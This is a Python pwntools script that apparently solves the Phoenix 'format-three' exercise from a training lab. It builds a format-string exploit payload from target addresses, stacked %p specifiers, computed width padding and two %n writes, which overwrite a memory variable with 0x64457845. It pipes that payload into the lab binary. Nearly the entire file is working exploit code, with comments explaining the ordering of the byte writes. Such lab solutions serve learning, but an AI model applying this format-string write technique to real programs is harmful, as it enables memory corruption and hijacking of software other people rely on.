from pwn import *

arch = "i486"
padding_char = b"X"


def pad(s, slen):
    return s+padding_char*(slen-len(s))


def remove_padding(s):
    return s.replace(padding_char, b"")


def to_str(s):
    return str(s, encoding="utf-8")


def to_bytes(s):
    return bytes(s, "utf-8")


def run(level, payload):
    write("/tmp/docgil", payload)
    print("payload: ")
    print(remove_padding(read("/tmp/docgil")))
    io = process("cat /tmp/docgil  | /opt/phoenix/" + arch + "/"+level, shell=True)
    return io.recvall()


def run_with_arg(level, arg):
    write("/tmp/docgil", arg)
    print("payload: ")
    print(remove_padding(read("/tmp/docgil")))
    io = process("/opt/phoenix/" + arch + "/"+level+" \"`cat /tmp/docgil`\"", shell=True)
    return io.recvall()


adr = pack(0x08049844, 32)
upper_adr = pack(0x08049844+0x2, 32)

print(adr)

# # find amount %p's
# for i in range(0, 30):
#     payload = b""
#     print("index: " + str(i))
#     payload += b"B"*4
#     payload += adr
#     payload += b"B"*4
#     payload += b"%p "*i
#     # payload += b"%n"
#     payload = pad(payload, 4096)
#     r = run("format-three", payload)
#     print(remove_padding(r))


target_value_hex = 0x64457845
target_value_dec = 1682274373
# too big for one write
# lower bytes need to be written first, otherwise would override upper bytes again
# lower 2 bytes = 0x7845
# upper 2 bytes = 0x6445
lower_bytes_dec = 30789
upper_bytes_dec = 25669
# upper bytes value is lower than lower bytes val -> need bigger value
# -> append 1
# -> this 1 will be written to other memory adr we dont care about
# adjusted: hex 0x16445
upper_bytes_adj_dec = 91205

magic_offset = 95

lower_offset = lower_bytes_dec - magic_offset

# find amount %p's
payload = b""
payload += b"B"*4
payload += adr
payload += b"B"*4
payload += upper_adr


payload += b"%p "*11
padding = "%" + str(lower_offset) + "x"
payload += to_bytes(padding)
payload += b"%n"

upper_offset = (upper_bytes_adj_dec - lower_offset) - magic_offset
padding = "%" + str(upper_offset) + "x"
payload += to_bytes(padding)
payload += b"%n"

payload = pad(payload, 4096)
r = run("format-three", payload)
print(remove_padding(r))
